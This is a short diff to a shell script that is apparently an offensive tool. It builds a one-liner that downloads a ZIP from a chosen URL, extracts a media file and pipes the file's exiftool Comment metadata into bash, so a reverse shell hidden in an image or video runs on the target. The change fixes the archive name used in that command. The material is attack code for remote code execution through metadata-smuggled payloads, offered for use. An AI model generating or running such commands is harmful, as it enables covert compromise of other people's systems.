@@ -161,7 +161,7 @@ case "$method_choice" in
     8)
         echo -e "\e[37mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
         read -p "Enter the name of the file inside the ZIP archive: " filename2
-        one_liner="curl -s '$url/$filename' -o $filename && unzip -p x.zip $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
+        one_liner="curl -s '$url/$filename' -o $filename && unzip -p $filename $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
         echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
         ;;
     *)
